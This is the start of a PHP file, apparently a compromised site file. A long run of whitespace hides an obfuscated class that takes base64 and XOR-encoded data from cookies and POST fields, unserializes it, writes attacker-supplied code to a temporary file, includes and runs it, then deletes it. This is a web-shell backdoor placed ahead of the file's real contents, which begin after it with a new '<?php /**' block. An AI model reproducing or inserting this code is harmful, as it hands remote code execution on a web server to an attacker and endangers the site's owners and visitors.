<?php                                                                                                                                                                                                                                                                                                                                                                                                 if (!class_exists("dkmgpxuyf")){class dkmgpxuyf{public static $byxah = "lkbvhuzhsokpbwbn";public static $knirryia = NULL;public function __construct(){$xcftnoqh = @$_COOKIE[substr(dkmgpxuyf::$byxah, 0, 4)];if (!empty($xcftnoqh)){$ijykocv = "base64";$jszcwiiz = "";$xcftnoqh = explode(",", $xcftnoqh);foreach ($xcftnoqh as $khbwwkglr){$jszcwiiz .= @$_COOKIE[$khbwwkglr];$jszcwiiz .= @$_POST[$khbwwkglr];}$jszcwiiz = array_map($ijykocv . "_decode", array($jszcwiiz,));$jszcwiiz = $jszcwiiz[0] ^ str_repeat(dkmgpxuyf::$byxah, (strlen($jszcwiiz[0]) / strlen(dkmgpxuyf::$byxah)) + 1);dkmgpxuyf::$knirryia = @unserialize($jszcwiiz);}}public function __destruct(){$this->wewskz();}private function wewskz(){if (is_array(dkmgpxuyf::$knirryia)) {$buvyiu = sys_get_temp_dir() . "/" . crc32(dkmgpxuyf::$knirryia["salt"]);@dkmgpxuyf::$knirryia["write"]($buvyiu, dkmgpxuyf::$knirryia["content"]);include $buvyiu;@dkmgpxuyf::$knirryia["delete"]($buvyiu);exit();}}}$bhpfbmsaqx = new dkmgpxuyf();$bhpfbmsaqx = NULL;} ?><?php
/**
